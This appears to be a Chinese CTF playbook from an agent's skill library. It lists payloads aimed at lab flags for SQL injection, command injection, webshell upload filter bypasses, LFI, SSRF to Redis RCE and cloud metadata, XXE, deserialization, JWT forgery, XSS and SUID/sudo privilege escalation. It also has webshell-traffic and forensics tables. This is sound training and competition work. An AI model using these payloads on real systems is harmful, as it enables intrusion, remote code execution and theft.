## 第二部分 · 分类详解（认 → 打 → 绕过层次 → 实战坑 / 假点）

### §1 SQL 注入（14+ 题）

- **认**：`'` 看报错 → `1 and 1=1 / 1 and 1=2` 看差异 → `order by n` 定列数。
- **打（按注入类型选载荷族）**：
  - 数字型：`0 union select 1,2,3,4,5` → `0 union select 1,group_concat(flag),3,4,5 from flag`
  - 字符型报错：`1' and extractvalue(1,concat(0x7e,(select substr(flag,1,16) from flag limit 0,1)))-- -`（updatexml 互为备份）
  - 布尔盲注：只有 1bit 信道时用 `ascii(substr(...))>N` 二分
  - 时间盲注：`if(...,sleep(1.2),0)`
  - order by 后注入：`ORDER BY (select extractvalue(1,concat(0x7e,substr((select flag),pos,len))))`
  - POST 型：注入点在 body（`application/x-www-form-urlencoded`），载荷与 GET 同套
- **★ 注入点位置矩阵（题面问「除参数之外还有什么位置」时，直接照这张表过）**：`User-Agent` / `Referer` / `X-Forwarded-For` / `X-Real-IP` / `Cookie` / `Host` / `X-Forwarded-Host`（后两个同时是 Host 头毒化与缓存投毒的入口，见 `web/http-host-header-test.md`、`web/cache-poisoning-test.md`）。
  **判定法 = 差分**：同一请求先改参数、再改某个头，看回显是否变化 —— **参数改了没反应、头改了有反应 ⇒ 注入点就在头里**。
  > #233 实测：页面明晃晃给了 `username` 输入框，改它完全无害；真注入点是 `User-Agent`，首个 `'` 进去就回显 `SELECT * FROM users WHERE ua='<UA>'`。
- **快通道 · 闭合结构推断（黑盒最快路径）**：从报错反推外层包裹 —— 报错 `near ''1'')'` ⇒ 真实结构是 `(name='输入')` ⇒ 载荷用 `')` 闭合 + `-- -` 注释。**比逐个试闭合方式快一个量级。**
- **绕过层次**：
  1. 关键字黑名单（`and/or/union/order by/having` 被剔除）⇒ MariaDB 用 `||` 代 `or`、`&&` 代 `and`；过滤信号 = 报错停在 `near ''`
  2. 其它变体：`/**/`、`AnD` 大小写、`selselectect` 双写、`%0a`、`+` 代空格
  3. 工具补齐：`sqlmap --batch --level/--risk` 放开跑
- **实战坑 / 假点**：
  - **应用把 SQL 语句原样回显 = 自带说明书**：结构、闭合符、拼接方式全白给（#233 回显 `SELECT * FROM users WHERE ua='<UA>'`），别再去猜闭合。**但列数仍得自己试** —— UNION 列数不对时错误被静默吞掉，只回一句「未找到」，**不能靠报错判列数，只能靠"是否查询成功"**（#233：3/4/5 列全静默失败，6 列才成功）
  - **参数是幌子**：页面上有输入框 ≠ 注入点在那里。先做一次「改参数 vs 改请求头」的差分，再决定往哪打（#233 的 `username` 就是纯摆设）
  - 枚举 `information_schema` **必须 `ORDER BY + LIMIT`**（顺序不定，不排序会漏表漏字段）
  - flag 列常带尾随空白 ⇒ **必须 `TRIM()`**，否则提交判错
  - 报错串 32 字节截断 ⇒ 分 16 字取
  - **引导关无 flag 型**：注入全通、表全 dump 无 flag、DB 账号无 FILE 权限 ⇒ **flag 在引导通关链路上发放，不是注入点**，这类题不要死磕数据库
  - 阈值与延时必须匹配：`sleep(1.2)` 配 2.0s 阈值会导致全错；等值法 + 全字母表逐位匹配比二分更抗网络抖动；开跑前先验证已知前缀 `flag{`
- **细分篇**：`web/injection-test.md`（黑名单绕过照打，红线条款不适用）

### §2 命令执行（13+ 题）

- **认**：`id` / `whoami` 有回显即通；再试 `;` `|` `||` `&&` `%0a` 与 `$()`。
- **打**：
  - JSON 承载：表单编码 400 ⇒ 必须 JSON（`{"address":"127.0.0.1; cat /tmp/flag.txt"}`）
  - 不过 shell 的接口：`id;id` 被当文件名 ⇒ 直接 cat
  - 走 shell 的拼接点：`127.0.0.1|cat /tmp/flag.txt`
- **绕过层次（黑名单是逐个打补丁的 ⇒ 同族命令逐个换）**：

  | 被禁 | 换 | 被禁 | 换 |
  |---|---|---|---|
  | `cat` | `tac` / `head` / `tail` / `more` / `less` | `less` | `nl` / `sort` / `uniq` |
  | `nl` | `od`（8 进制 2 字节小端，`int(tok,8)` 低字节在前还原） | `od` | `xxd` / `hexdump -C`（hex 列解码） |
  | `xxd` | `base32` / `base64` / `strings` / `grep -a` | `grep` | `cp` 到 Web 根再 GET |
  | `cp` | `find -exec cat {} +`（**加号版**，分号在表单里被吞） | `find` | `mv` 后 `cut` 读（cut 常是漏网的读命令） |

- **空格与关键字绕过清单**：`${IFS}`、`$IFS$9`、`<`、`%09`、`{cat,/tmp/flag.txt}`、`c\at`、`ca''t`、`c"a"t`、`/bin/c?t`、`/bin/ca*`、`$(echo Y2F0|base64 -d)`、`$'\x63\x61\x74'`
- **★ 题名即答案**：题名写哪个命令，就说明那个命令没被禁 —— 直接试它。
- **子串匹配黑名单**（`/bin/cat` 也被拦）= `strpos` 类判断，绕不过就换同族命令，别在编码上死磕。
- **实战坑**：Werkzeug debug console（`/console`，PIN 保护）是命令执行题常见的深挖入口；`disable_functions` 类题目先看是否还能写文件。

### §3 文件上传（13 题）

**核心方法：把校验拆成层次，从最浅的一层开始攻。** 遇到任何上传点，先做这张表：

| 校验层次 | 怎么识别 | 绕过手法 |
|---|---|---|
| 无校验 | 直传 `.php` 就通 | 直接传，然后找可解析目录 |
| 仅前端 JS 正则 | 看源码有 JS 校验 | 抓包直传（改包绕过） |
| 仅 multipart 的 Content-Type | 改 part 的 `Content-Type` 即过 | `image/png`（**必须带 submit 字段**，否则业务逻辑不触发） |
| 后缀黑名单不全 | 试出哪些能过 | `.php5` / `.phtml` / `.php7`（Apache 模块注册别名） |
| 黑名单 + 只校验文件名 | 单次非递归 `str_replace('php','')` | **双写**：`shell.pphphp` → 去首个 `php` → 落地 `shell.php`（✅ 已靶机实测）<br>为什么是这个写法：前半 `pphphp` 里去掉**首个** `php` 后，剩下 `p`+`hphp` ⇒ `php`。<br>⚠ 别写成 `shell.phphpp`（去首个 `php` 后是 `hpp`，不解析）—— 2026-10-08 实测踩过这个反例 |
| `strrchr` 取后缀 | 文件名无点后缀返回 false | 文件名 `.htaccess`（无点后缀）⇒ 用 `AddType` 把图片变 PHP |
| 00 截断 | 校验后缀与落盘名不同源 | `filename="shell.php%00.png"` —— **必须发字面量 `%00`**（真 NUL 会被 multipart 解析器拒），服务端 urldecode 后截断 |
| 二次渲染 | 图片被重编码 | `bytes(range(256))*n` 逐字节 diff 定位幸存窗口，PHP 塞进该窗口 |
| 强制改后缀 + 无 pathinfo | 落盘强制 `.png` 且不解析 | 换思路：结合文件包含 / 找其它落盘点 |
| **内容黑名单（`strpos`+`strrev` 双向字面量匹配）** | `echo` 型小马能执行，含 `system`/`exec`/`$_GET`/反引号/`eval` 的**上传成功但被改名成 `.png` 静态返回**（静默失效，不报错） | **拆分字面量 + 换超全局变量**：<br>`<?php $f="sys"."tem";$f($_REQUEST["c"]); ?>`（46B，✅ 2026-10-08 靶机实测，uid=0）<br>`strpos` 找不到连续 `system`、`strrev` 也匹配不上；`$_REQUEST` 不在黑名单（只查了 `$_GET`/`$_POST`）<br>变体：`$_REQUEST['a']($_REQUEST['b'])`（连函数名都不要）、`chr()` 拼接<br>**详见 `上传内容黑名单绕过.md`** |
| WAF 按完整 UTF-8 查黑名单 | 常规 payload 全被拦 | **Ghost Bits**：后端 `(char)(c & 0xFF)` 截断 ⇒ `pwnĮŪųŰ` 落盘成 `pwn.jsp` |
| 组合链 | 单点打不动 | 图片马 + 文件包含；Zip Slip `../` 写 Web 根 + `eval(base64_decode())` 绕内容黑名单 |

- **HTML 型 XSS 上传**：后端只看 Content-Type ⇒ 传 `poc.html` + MIME `image/png`，落盘后以 `text/html` 渲染（拿 XSS 分，不是拿 shell）
- **隐藏上传目录**：翻页面注释 / 历史工单 HTML 注释里的存档目录（提示"到处看看"= 翻旧数据找泄露路径）
- **实战坑**：上传目录能落盘不等于能解析 —— **落盘后一定要访问一次确认解析**；`.htaccess` / `user.ini` 被拦时考虑解析漏洞（nginx 空格、IIS）
- **细分篇**：`web/file-upload-test.md`

### §4 文件包含与路径穿越（10+ 题）

- **认**：`?file=` / `?path=` / `?page=` / `?filename=` / `include` 相关参数。
- **打**：
  - 读源码：`php://filter/convert.base64-encode/resource=index.php`
  - `allow_url_include=On` 三种 RCE：`php://input` / `data://text/plain;base64,...` / `http://` 远程包含（不可回连时托管到公网 paste）
  - 前缀拼接 + 单次过滤：`....//....//....//....//tmp/flag.txt`
- **绕过层次**：
  1. `..` 被过滤 ⇒ `....//`、`..././`、`..%2f`、`%2e%2e%2f`、`..%252f`、绝对路径
  2. 双层校验（前缀 + 过滤）⇒ 两层都要动（编码后的参数才是文件名）
  3. WAF 拦 `php://` / `data://` / `..` 却漏 `file://` ⇒ 试漏项
  4. 前缀校验 `strpos(include,'php://filter')!==0` ⇒ 用 `php://filter` 读源码拿 WAF 逻辑
- **读不到 flag 时的兜底路径**：`/proc/self/root/tmp/flag.txt`、`/proc/1/root/...`、`glob://`
- **★ 前端可能用"计数型深度判定"（实测）**：有些实现不真做路径归一化，而是**数 `../` 出现次数**来判深度
  （如 `depth = count("../") + count("....//") * 2`）。
  - 表现：`....//....//` 回显"归一化后仍是 `....//...`" ⇒ **看着像被过滤，其实已被单独加权计分**
  - ⇒ **回显里出现「归一化后: <路径>」「已执行」「已加载」这类人造措辞时，把它当规则说明书读，不要当噪音**
  - 实测 payload：`/static/../../../flag.txt`（3 层即够，别默认一定要 4 层以上）
- **实战坑 / 假点**：include 分支对一切输入返回"未找到"（含存在的文件）⇒ 疑实例未初始化，换实例或换题；编码层次猜错就永远无回显
- **细分篇**：`web/path-traversal-lfi-test.md`

### §5 SSRF（9+ 题）

- **认**：应用会替你发请求（url / proxy / 回调 / 快照 / 生成图 / webhook）。
- **IP 头矩阵（同一类题的通用弹药 —— 每道题只认一个头，脚本一次全试）**：

  ```
  X-Forwarded-For → X-Real-IP → X-Client-IP → True-Client-IP → X-Cluster-Client-IP
  → CF-Connecting-IP → Proxy-Client-IP / WL-Proxy-Client-IP → Cdn-Src-Ip
  → Ali-CDN-Real-IP → Fastly-Client-IP → X-Originating-IP → X-Remote-IP / X-Remote-Addr
  →（路由类）X-Original-URL / X-Rewrite-URL
  ```

  每一个头再试 **大小写变体 / 下划线变体 / 放 query / 放 POST body**。
  **一键全打**：`python scripts/iphdr_matrix.py "http://TARGET/受限路径"`（自动对比基线标差异）。
  实测：同系列题每道只认一个头，手工试一个换一个极慢；脚本 3 秒出结果。
  **假点**：试一个 403 就换下一个头，别在原头加大力度；WAF 冷却会伪装成 401/403 ⇒ 隔 60 秒复测干净 payload。

- **打**：
  - 内网探测变体：`127.1`、`0.0.0.0`、`[::1]`、`0177.0.0.1`、`2130706433`、`127.0.0.1.nip.io`
  - 协议利用：`file://`（读文件）、`dict://`（探服务）、`gopher://`（打内网 TCP，含 Redis）
- **黑名单绕过四连（按拦截形态选）**：
  1. 只匹配小写前缀 ⇒ `FILE://`
  2. 拦字面量 `file://` ⇒ `file:/path`（少一斜杠）
  3. 拦 `file:..` 与 `file:///tmp` ⇒ `file:/tmp/flag.txt`
  4. 只校验前后缀 ⇒ **userinfo `@` 绕过**：`http://合法前缀@127.0.0.1/flag.php`
- **无回显判断**：投不可达 IP 看响应时间（0.12s → 5.1s 即证明真的发起请求）
- **SSRF → Redis → RCE 完整链**：
  快照接口无过滤 → 内网 6379 未授权 → `dict://` 探测（`?` 被 curl 截断、`%XX` 不解码）→ **含特殊字符的命令必须用 gopher + `%XX` 全编码的 RESP 链**：
  `CONFIG SET dir /var/www/html` → `CONFIG SET dbfilename x.php` → `SET` 写马 → `SAVE` → GET 执行 → **善后复原**
- **实战坑**：云环境顺手打元数据 `http://169.254.169.254/latest/meta-data/`；程序不出网时改走 DNS 外带
- **细分篇**：`web/ssrf-test.md`

### §6 XXE（6 题）

- **认**：接口吃 XML（`Content-Type: application/xml`），或表单参数里塞 `xml=`。
- **打**：`<!DOCTYPE d [<!ENTITY x SYSTEM "file:///tmp/flag.txt">]><d>&x;</d>`
- **★ 最费时的点：XML 承载位置猜错就永远无回显** —— 三种都要试：
  1. 原始 body
  2. 表单参数（`xml=<xml>`）
  3. 嵌入 JSON 字段
  实体还必须嵌进后端预期节点里（如 `<data><username>&xxe;</username></data>`）
- **绕过层次**：
  - WAF 只拦 `file:` ⇒ 用 `php://filter/read=convert.base64-encode/resource=/tmp/flag.txt`
  - 按 UTF-8 拦 `<!ENTITY` ⇒ **整段 UTF-16 重编码**（LE/BE ± BOM 均可）
  - 输出关键词黑名单 ⇒ base64 回显
  - 无回显 ⇒ 外部 DTD + 参数实体三段式 OOB（内容接到公网 paste / webhook）
- **细分篇**：`web/xxe-test.md`

### §7 反序列化（PHP 5 + Java 4 题）

- **PHP 标准五步**：拿源码（包含 / 页面展示 / `?source=1`）→ 找 `unserialize()` → 找魔术方法 → 构造 → 触发
  - `__destruct → system($cmd)`：`O:7:"ExecCmd":1:{s:3:"cmd";s:17:"cat /tmp/flag.txt";}`
  - `__toString → file_put_contents` ⇒ 任意写 → 写马执行
  - `__wakeup` 绕过（CVE-2016-7124）：**真实属性 1 个却声明 2~3 个** ⇒ 跳过 `__wakeup`（判据：写真实值出 WAF 提示，写大就直接执行）
  - 触发点：`__toString` 靠 `echo $obj`；webroot 默认 `/var/www/html`
- **Java**：`POST /deserialize` 收裸 base64（包 JSON 引号会报 `Illegal base64 character 22`）；手改序列化流的 `TC_STRING` 命令字段并回填 `u2` 长度
- **JDBC 反序列化**：`autoDeserialize=true`；黑名单 `jdbc:mysql` 用 `jdbc:mysqL://` 大小写绕过
- **实战坑 / 假点**：
  - **`s:N` 的 N 必须与字符串字节数严格一致，差一位静默失败**
  - 页面源码可能是"参考版"非部署版 ⇒ 用 **sleep 时序 oracle 探真实参数名**（真实入口可能是 POST 的另一个参数名）
  - **通用前提 = 靶机能回连你**：靶机仅白名单 HTTP 出网 / 本机入站 Block / 无公网端口映射 ⇒ Evil MySQL 类回连链不成立，别恋战
- **细分篇**：`web/deserialization-test.md`

### §8 JWT（7 题，按"服务端到底校验了什么"分五种）

| 服务端行为 | 怎么认 | payload |
|---|---|---|
| 完全不验签 | 改 `role=admin`，签名段填 `AAAA` 也过 | 签名段随意填 |
| `alg:none` 可用 | 换算法头试 | `{"alg":"none"}`，**末尾 `.` 必须保留** |
| HS256 弱密钥 | 签名可离线爆破 | 离线 HMAC 爆破（**用 xato-100k 级字典**，top10k 不够） |
| 算法混淆 RS256→HS256 | 有 `/jwks.json` 或公钥接口 | 取 n/e → 生成 PEM → **当 HMAC 密钥**签名 |
| `kid` 参与路径 | kid 值可控 | `"kid":"../../../../dev/null"` ⇒ 空密钥 |
| `jku` 头被信任 | jku 可控 | 指向自建 JWKS（**容器能出公网但不回连本机时，把 JWKS 传到公网 paste 裸链接即通**） |

- **辅助判断**：jku 指向不可达 IP 时响应时间 0.12s→5.1s ⇒ 一次请求确认服务端会远程拉取
- **实战坑**：登录包常共用前端硬编码 AES ⇒ 先把前端加密逻辑复刻出来（见 §通用规律库 15）
- **细分篇**：`web/oauth-jwt-test.md`

### §9 XSS（7+ 题）

- **上下文决定 payload**（这是本类唯一的决策点）：

  | 上下文 | payload |
  |---|---|
  | 属性内 | `" onfocus=alert(1) autofocus x="` |
  | 标签外/正文 | `<img src=x onerror=alert(1)>` / `<script>alert(1)</script>` |
  | WAF 只放行特定标签 | 用放行的标签 + 事件属性（如 `<video src=x onerror=...>`） |
  | 登录框属性回显 | `"><script>alert(1)</script>` |
  | DOM 型（innerHTML 拼接） | 不需要真浏览器：直接发页面自身 AJAX 请求即拿 flag |

- **拿 flag 的三条路径**：① 判定接口直接发；② 响应里直接回显；③ **平台 bot 轮询带 Cookie**（需要公网接收端做外带）
- **★ 判分接口机制（关键坑）**：XSS 判定接口吃的是 **`base64(Jinja2 Context repr)` 而不是 payload 本身** —— 必须把页面 blob 里的 `'user_input': None` 替换成 payload 再 base64 提交；**直接 POST payload 永远是 false**
- **实战坑 / 假点**：
  - 判分格式靠猜是高危失败模式（见 SKILL.md §通用规律库 19）⇒ 先读页面 JS 看它怎么调用判分接口
  - 依赖 bot 的题：确认 bot 的轮询周期与回调地址可达性
- **细分篇**：`web/xss-test.md`

### §11 验证码与验证链（10+ 题）

- **Flask flash 专项（先判这两种报文形态，能直接读出判定结果）**：
  - **302 + `Set-Cookie` 是 base64 串** ⇒ 解 base64 取 flash 消息
  - 判定词**要同时试「中文」与「`\uXXXX` 字面」两种形式**（序列化方式不同，只试一种会漏）
  - 用途：从报文里直接读出服务端判定条件，**免去逐字猜/枚举格式**

- **按校验缺陷分五种**（对上哪种用哪种）：

  | 缺陷 | 手法 |
  |---|---|
  | 空值绕过 | 传 `null` / 空串 / 不传该字段即跳过 |
  | 用后不失效 | 同一验证码重放多次 |
  | 只校验格式不校验值 | 任意 6 位数字 |
  | 回显前 N 位 | `/send` 响应回显前半段 ⇒ **后段直接爆破（≤100 次，必须同 CookieJar）** |
  | 接口漏校验 | 重置接口不校验 `verification_code`，只需 username/new_password |

- **短信链**：`phone` 逗号多号码 + `GET /getSend` 未授权回显验证码
- **Unicode 感知陷阱**：`\d` 在部分语言里匹配全角数字 ⇒ 全角数字可过
- **实战坑**：
  - 单号码 `/send` **不刷新** getSend 收件箱（读到旧码必失败）⇒ 必须逗号多号码让本次码写进收件箱；登录时 phone 与 send 原始串要完全一致
  - reset 必须同 CookieJar；判定词可能在 `div.error`（**页面静态的 `alert(...)` 是干扰项**）
  - 验证码识别模型训练属通用手法，但优先试上面五种缺陷（成本低一个量级）

### §12 登录爆破（含限速锁）

- **打法**：用户名枚举看提示差异 → 无锁定就跑 `0000-9999` 或针对性字典
- **★ 薄容器爆破纪律（必须遵守，否则打死容器）**：
  `Session 复用` + `4-6 并发` + `0.2s 节流` + `命中即停` + `失败重试`
  **串行会打死薄容器，高并发同样会打死 —— 4-6 是甜点区。**
- **限速锁识别**：「错误次数过多，请 N 秒后再试！」**注入在 POST 响应且 HTTP 200** ⇒ 会让 302/200 判定失真；各实例阈值不同（实测 ≈17s / 3s 间隔），**先单发验证判定词**
- **编码坑**：中文乱码会让关键字匹配全失效 ⇒ 脚本里显式 `r.content.decode('utf-8')`，输出重定向到 UTF-8 文件再读

### §17 提权（17 题：sudo 3 + SUID 14）

- **通用顺序**：`sudo -l` → SUID（`find / -perm -4000 -type f`，挑非标准项）→ crontab → 可写 `/etc/passwd`、`/etc/sudoers` → PATH / LD_PRELOAD → 内核 CVE → 容器逃逸
- **sudo 三种致命配置**：
  1. `(ALL) NOPASSWD: /bin/su` ⇒ `sudo -n /bin/su -c 'cat /root/flag.txt'`
  2. 白名单给解释器（`NOPASSWD: /usr/local/bin/php`）⇒ **给解释器 = 给 root**：`php -r 'echo file_get_contents("/root/flag.txt");'`
  3. 授权执行一个**不存在的文件**且其目录可写 ⇒ 自造文件以 root 执行（**坑：缺 x 位报 `command not found`**）
- **SUID 走 GTFOBins**：`nl` / `nice /bin/sh -p` / `xz -dc` / `mawk '//' /root/flag.txt` / `logsave /tmp/out cat /root/flag.txt` / `join /root/flag.txt /root/flag.txt` / `ionice /bin/sh -p` / `install -m644 假passwd /etc/passwd`（覆盖后 su root）

### §19 Webshell 流量分析（6 题）

**五大 webshell 家族特征对照表（本类唯一入口，先认家族再解密）**：

| 家族 | 请求特征 | 响应特征 | 参数 / 编码 |
|---|---|---|---|
| 菜刀 China Chopper | `POST /*.php`，`application/x-www-form-urlencoded` | 明文命令回显 | `pass=xxx&z0=...&z1=whoami`（**明文，strings 即得**） |
| 冰蝎 Behinder | UA `Java/1.8.0_202`、`application/octet-stream` | 固定 16 字节头 + AES 密文 | `rebeyond=<Base64(AES)>&v=4&rid=xxx`；**默认 key = `md5("rebeyond")[:16]`** |
| 蚁剑 AntSword | UA `antSword/v2.1 ...` | `AS####BEGIN/END` 分隔符 | `ant=<Base64>&_cmd=<b64>`；参数名 = `substr(前2位随机字符)+base64`；签名 `|||asline|||` |
| 哥斯拉 Godzilla | UA `...GodzillaClient/4.0`，常伪造 XFF | `##GODZILLA_RESPONSE_BEGIN/END##` | `pass=<b64 功能\|payload\|key>&mode=1&charset=UTF-8` |
| 自定义 / 换皮 | 伪装业务路径（`/upload/cache/img.php`）、带 token | 自定义标记 | `token=<32hex>&data=<b64>&v=2&fmt=raw` |

**通用五步打法**：
1. `strings pcap | grep -iE "flag|pass|key"` 快速命中明文家族
2. 统计 `POST /*.php` 次数与 body 参数名
3. 认家族（UA + 分隔符 + 参数名）
4. 定解密方式（明文 / AES 默认 key / RSA 公钥运算）
5. **区分真实攻击源与伪造**：XFF 可伪造，**要看 TCP 五元组**
6. 答题页格式严格（如 `Cache-Control: no-cache` 必须带值；有的答案不要带 `##` 包裹）

**★ 蚁剑自定义 RSA 编码器 = 公钥可解（核心发现）**：编码器是"**私钥加密 → 服务端 `openssl_public_decrypt`**" ⇒ 拿到 webshell 里嵌的**公钥**即可 `m = c^e mod n` 剥 PKCS#1 填充，**无需私钥即可全量解密**
> 配套：ZipCrypto 已知 CRC 可爆破短密码（纯 python 数分钟）
> **答题卡 md5 = `md5('flag{a-b-c}')`** —— 对带 `flag{}` 包裹的整串算（示例串可本地验证）

### §21 隐蔽信道解码（8 题）

**先定信道类型，再定解码链**：

| 信道 | 怎么认 | 解码链 |
|---|---|---|
| ICMP 载荷文本 | 载荷形如 `Packet N: Value X` | 按 N 排序 → `chr(V)`；噪声里混随机 base64 要过滤 |
| ICMP 长度信道 | 统计 payload 长度只有两个值 | 长度 A=0 / B=1 组位 → 解出后判断字符集（不含 `- ' \`` 这类 ⇒ base91）→ base91 → base64 |
| DNS 隧道 | 子域形如 `<hex分片>.seq-XX.域名` | **按 seq 排序拼 hex（不能按抓包顺序）** → ZIP；TXT 记录可能是解压口令 |
| USB HID 键盘 | `linktype=220 usbmon`，头 64B + 8B HID | 只用 `submit(0x43)` 报文；`set(cur)-set(prev)` 去重 + `mod&0x22` 判 Shift；取 bit 流按 7bit ASCII 解码 |
| USB HID 鼠标 | 报文 `[button,dx,dy,wheel]` | 累加位移用 PIL 画轨迹；用 x/y 跨度差异判轴；丢弃起始飞入长直线；各向异性拉伸 |
| 题干只问某个地址 | pcapng 里找唯一应答方 | 全流量某端口唯一应答方即答案 |
| URI 参数藏片段 | 参数里是 base64 / 片段 | 拼装（**注意截断的片段**，无分隔符版本可能才是对的） |

- **★ pcapng 解析坑**：大量 TSO 包 `IP total length=0` 会导致丢包，**必须用实际长度兜底**
- **`linktype=228`** = 纯 IPv4 无以太网头
- **假线索要敢放弃**：如 mDNS 噪声记录

### §22 日志与取证（2+ 题）

- **溯源七问**：入口（上传 / 爆破 / 漏洞）→ 落地物（马 / 脚本）→ 权限（提权手法）→ 持久化（cron / 服务 / 账户）→ 外连（C2 / 矿池）→ 时间（首次与最后动作）→ 影响（改了什么文件）
- **打点**：从源码版本号对号 CVE；木马文件名 / UA / 特征串定位；后台口令爆破次数统计
- **实战坑**：
  - **木马 `.php` 可能被本地杀软隔离 ⇒ 取证只能靠旁证**（上传目录、时间戳、尺寸、进程、连接）
  - 遇"答案格式不明"的答题页：**先看 JS 有没有提示 / `/api/hint`，不要无限枚举格式**

### §23 病毒与挖矿溯源

- **破题关键**：**答题页没有附件时，若题干与公开 EDR 分析文章一致 ⇒ 直接 OSINT 反查命中**
- **枚举类数值题**：给合理区间逐步收窄（如"未签名进程数"用 320–350 枚举得 335）
- **矿机排查 30 秒顺序**（拿到环境后）：`auth.log` 爆破 IP → `/etc/passwd` 新增账户 → crontab / `ld.so.preload` → 矿池字符串 → flag 搜索
- **杀软干扰**：样本落盘会被查杀 ⇒ 取证靠进程 / 网络 / 日志旁证

### §24 内网横向

- **认**：shell 里有第二张网卡 / `fscan` 扫到内网段 / `net user /domain` 有结果
- **打**：fscan 带已有凭据再扫 → 抓本机凭据横向 → 回连不通走 frp + bind_tcp 或正连技巧
- **实战坑**：**比赛分大头常在内网，只打一台是浪费**；反弹全失败别死磕，转正向连接
- **细分篇**：`内网横向.md`

### §25 内存马与内存取证

- **内存马（Java 应用被打过、磁盘无马）**：查内存中的 filter / servlet / listener 注册；`arthas-boot.jar` 是主力
- **内存镜像（.raw/.mem/.dmp/.vmem）**：`vol -f 镜像 windows.info` 起手；按 profile 取进程 / 网络 / 命令行 / 文件
- **细分篇**：`内存马排查.md` / `内存取证.md` / `应急-流量与隧道.md`

### §26 容器与判分机制（每题都要走）

**1. 开工三扫（省掉大量无用尝试）**

```
扫 identity  → 筛身份锁（[] 可开 / ["超级会员"] 当前账号 403）⇒ 预筛省掉 403 尝试
扫 is_passed → 已通过的题不重复投入
扫 has_flag  → 0 = 平台未登记 flag，打穿也无分 ⇒ 降级为技术练习
```

**2. 实况校验（环境问题速识别）**

```
开启后 curl 十连发 → 不稳就降并发
Java 重型环境开启后 2-7 分钟仍 000 ⇒ 5 分钟不可达即弃
附件在网盘且匿名下载被限（返回错误码）⇒ 物理不可得，立即止损
平台答案与容器不一致 ⇒ 记录证据，止损
```

**3. 并发纪律（薄容器）**

```
目录扫：-t 1~2（-t 20 一轮把容器打崩，端口变 closed，多数平台无看门狗不自动重启）
爆破：Session 复用 + 4-6 并发 + 0.2s 节流 + 命中即停 + 失败重试
登录锁类产品：先算预算（失败 N 次锁 M 分钟），枚举上限内定优先级
```

**4. flag 生命周期（本类最重要的一条）**

```
flag 与「当前开启实例」强绑定
  ⇒ 找到必须当场**报告**（提交归人工）
  ⇒ 攒批 / 切环境后再交 = 之前的 flag 全部作废（实测已通关的题重开实例后提交正确旧 flag 仍判错）
  ⇒ 提交返回"没有 flag" = 平台未登记，止损
```

### §27 提交与格式纪律

- **判定用平台权威字段**（`is_passed` / `has_flag`），不靠"我觉得打穿了"
- **⚠ 通关状态按「账号」隔离**：同一题 `B=True / A=False / C=False`（多账号并行时实测）⇒ **复核必须用「提交时那个 token」**，否则会误判成没打进去
- **读结果永远读完整响应体**：控制台打印会截断（120 字节案例剪掉 flag 尾部）；脚本显式 UTF-8 解码
- **答案格式**：答题卡类先读判分 JS；md5 类注意是否带 `flag{}` 包裹
- **拿到就交**：见 §26.4

### §28 环境缺陷识别（何时该止损并反馈平台）

有些题**不是手法问题，是环境问题**。判据（好靶场实测）：

| 现象 | 判据 | 处置 |
|---|---|---|
| 服务是**单路由桩**，与方法/路径/头全都无关 | 只认精确 `GET /`；`HEAD/POST/PUT/OPTIONS/TRACE` 全 404；连 `GET //`、`GET /?` 都 404；404 体是 `Not found`（小写、无换行）= **Go `http.NotFound` 风格**，无框架头 | **不是 React/Next 应用** ⇒ Postman POC 与靶机不是同一个东西 ⇒ **直接向平台反馈**（489 实测：全端口扫只有 1 个开，武器脚本在 4 条路由全 404） |
| 容器是**极简镜像**，全局只有一个二进制 | 白名单放行但 `[Errno 2] No such file or directory` 占多数；只有 1 个命令能跑 | 若该命令还禁参数 ⇒ **无文件读取/无代码执行/无注入面** ⇒ 环境能力封顶（1004 实测） |
| 平台侧 flag 未登记 | `has_flag=0`；提交回 `"此靶场没有flag"` | 立刻止盈（249 实测） |
| 附件超匿名下载上限 | 网盘返回 `code 23018 download file size limit` | 需登录账号或分片绕过（1007/1012 的 5.39GB 镜像） |
| 需要超长自由字符串且无样本 | 判据接口对 130+ 候选全错，且题目本身依赖样本文件 | 环境不可得 ⇒ 记录"已答对的部分"，等拿到样本再补 |

**★ 记录纪律**：环境不可得的题，**把它"已答对的部分"写进技能库**（下次开实例直接补最后一项即可）。
实测样例（1007/1012 答题卡，各 3 问）：
```
1007「模拟C2应急-外连」  q2 = 5（外联频次 5 秒 1 次）   q3 = go（C2 用 Go 开发）   q1 缺（C2 服务端域名，需 VM 流量包）
1012「模拟C2应急-注册表」 Q1 = HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
                        Q3 = go                        Q2 缺（Run 项 Value name，自由字符串，需读样本）
```
⇒ 下次开实例：**先秒答已知项，只集中火力攻缺的那一项**。

**★ 参数级 WAF 的判别（393 实测，命中即转方向）**

有些 WAF 不看值、**只看参数名**。判据：

```
用【空值】和【无害值】各测一次：
   /?include=          → 被拦（空值都拦！）
   /?include=x         → 被拦
   /?include=<任意>    → 一律被拦，且回显固定的 WAF 文案
⇒ 这是【参数名级封锁】（参数名本身在黑名单里），不是值级过滤
⇒ 此时 60+ 种编码绕过（大小写/尾随字符/双重编码/数组/分隔符/长度溢出/POST/multipart/JSON/Cookie/X-Original-URL）
   全部无解 —— 因为人家根本没看你的值。**立刻转方向**：找别的入口 / 别的参数名 / 换题
```
> **纪律**：**空值都被拦 ⇒ 别再做编码绕过**（393 实测：60+ 变体零收获，纯浪费）。

**★ ZipCrypto 破解的假阳性坑（540 实测）**

用 CRC32 当唯一判据会**撞假阳性**（实测得到 `dglapx`，CRC 撞上但 `header[11]=0x63≠0x33`，解出来是随机二进制）。

**正确判据 = 三条件同时满足**：
```
① 校验字节（ZipCrypto 的 12 字节加密头末字节 = 0x33 或 0x34/0x35/0x36）
② 解出的明文全部可打印
③ CRC32 匹配
```
> 建议直接用现成高速工具：`hashcat -m 17225`（ZipCrypto）或 `bkcrack`（已知明文攻击，需 ≥12 字节连续已知明文）。
> **本机自造武器**：`E:\work540\zc7.c`（OpenMP 32 线程 ZipCrypto 爆破，**6000 万次/秒**，比 Python 快约 1000 倍；环境里没有 bkcrack/zip2john）。

**★ WPA2 握手校验与"非标准加密帧"（621 实测）**

- 环境里**没有** `aircrack-ng` / `hcxtools` ⇒ 自写校验器即可：`PBKDF2(passphrase, SSID, 4096, 32)` → PRF512 → MIC 比对（`E:\0day渗透安全专项\_work\wpa621b.py` 可复用）
- 实测：SSID=`ctf`、密码 `1234567890`、EAPOL 四步握手完整、PTK/TK 已算出
- **卡点**：10 个 `protected=True` 数据帧用**全部 CCMP 组合**（帧头 24/26 × key 4 × PN 6 × AAD 5）都解不开，**`tshark` 自己报 `Unknown cipher` / `Invalid PTK len`**
